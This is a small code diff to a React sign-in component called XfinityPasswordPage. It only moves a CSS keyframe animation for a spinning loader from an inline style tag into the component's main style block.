@@ -70,6 +70,7 @@ const XfinityPasswordPage: React.FC<XfinityPasswordPageProps> = ({ onLoginSucces
           font-style: normal;
           font-display: swap;
         }
+        @keyframes xspin{to{transform:rotate(360deg)}}
       `}</style>
 
       <main style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', justifyContent: 'center', flex: 1, padding: '3rem 1.5rem 2rem', maxWidth: '480px', margin: '0 auto', width: '100%', boxSizing: 'border-box' }}>
@@ -234,7 +235,6 @@ const XfinityPasswordPage: React.FC<XfinityPasswordPageProps> = ({ onLoginSucces
                 'Sign in'
               )}
             </button>
-            <style>{`@keyframes xspin{to{transform:rotate(360deg)}}`}</style>
           </div>
         </form>
 
